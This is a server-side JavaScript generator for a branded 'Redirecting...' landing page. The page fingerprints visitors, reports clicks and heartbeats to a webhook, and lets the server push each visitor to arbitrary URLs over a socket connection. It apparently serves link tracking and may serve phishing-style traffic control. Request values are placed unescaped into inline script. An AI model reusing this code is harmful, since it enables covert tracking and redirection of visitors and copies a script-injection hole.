// ============================================================
// MEGA TOOLS — LANDING PAGE HTML GENERATOR (Server-side)
// ============================================================

const CONFIG = require('../config');

function generateRedirectHTML({ baseUrl, trackingCode, slug, chainData = null }) {
  const apiBase = CONFIG.CLIENT_URL || 'http://localhost:5000';
  const delay = 1500;
  const heartbeatInterval = 10000;

  let chainScript = '';
  if (chainData?.isChain) {
    chainScript = `
    var chainId = '${chainData.chainId || ''}';
    var chainStep = ${chainData.chainStep || 0};
    var chainStepName = '${chainData.chainStepName || ''}';
    socket.on('chain_update', function(d) {
      if (d && d.targetUrl) window.location.href = d.targetUrl;
    });`;
  }

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
  <title>Redirecting...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; font-family: 'Segoe UI', Roboto, system-ui, sans-serif; }
    body { background: linear-gradient(135deg, #0f172a, #1e293b); display: flex; align-items: center; justify-content: center; }
    .spinner { width: 48px; height: 48px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #6366f1; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loading-text { color: #94a3b8; font-size: 14px; font-weight: 400; margin-bottom: 8px; }
    .brand { color: #6366f1; font-size: 12px; font-weight: 500; opacity: 0.8; }
    .footer { position: fixed; bottom: 20px; left: 0; right: 0; text-align: center; color: #475569; font-size: 11px; }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js"></script>
</head>
<body>
  <div style="text-align:center">
    <div class="spinner"></div>
    <div class="loading-text">Please wait...</div>
    <div class="brand">Powered by Mega Tools</div>
  </div>
  <div class="footer">&copy; 2026 Mega Tools. All rights reserved.</div>
  <script>
    (async function() {
      var path = window.location.pathname;
      var parts = path.split('/').filter(Boolean);
      var lastPart = parts[parts.length - 1] || '';
      var TK = '${trackingCode || slug || 'default_tracking'}';
      var TARGET = '${baseUrl || 'about:blank'}';
      var API = '${apiBase}';

      // Fingerprint-based visitorId (sessionStorage)
      var VID = sessionStorage.getItem('_vid');
      if (!VID) {
        try {
          var fp = await FingerprintJS.load();
          var result = await fp.get();
          VID = 'fp_' + result.visitorId;
          sessionStorage.setItem('_vid', VID);
        } catch(e) {
          VID = 'v_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6);
        }
      }

      // Webhook click tracking
      fetch(API + '/api/webhook/click', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ trackingCode: TK, visitorId: VID, source: 'entry_link', metadata: { url: window.location.href } })
      }).catch(function() {});

      var s = document.createElement('script');
      s.src = API + '/socket.io/socket.io.js';
      s.onload = function() {
        var socket = io(API, { transports: ['websocket', 'polling'], reconnection: true });
        socket.on('connect', function() {
          socket.emit('session_init', { visitorId: VID, trackingCode: TK });
          socket.emit('joinRoom', TK);
        });
        socket.on('nav_update', function(d) { if (d && d.targetUrl) window.location.href = d.targetUrl; });
        socket.on('msg_push', function(d) { if (d && d.targetUrl) window.location.href = d.targetUrl; });
        socket.on('connect_error', function() { window.location.href = TARGET; });
        ${chainScript}
        setInterval(function() {
          fetch(API + '/api/data/heartbeat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ visitorId: VID, status: 'Active' })
          }).catch(function() {});
        }, ${heartbeatInterval});
        window.addEventListener('beforeunload', function() {
          fetch(API + '/api/data/heartbeat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ visitorId: VID, status: 'Offline' })
          });
        });
        setTimeout(function() { window.location.href = TARGET; }, ${delay});
      };
      document.head.appendChild(s);
    })();
  </script>
</body>
</html>`;
}

module.exports = { generateRedirectHTML };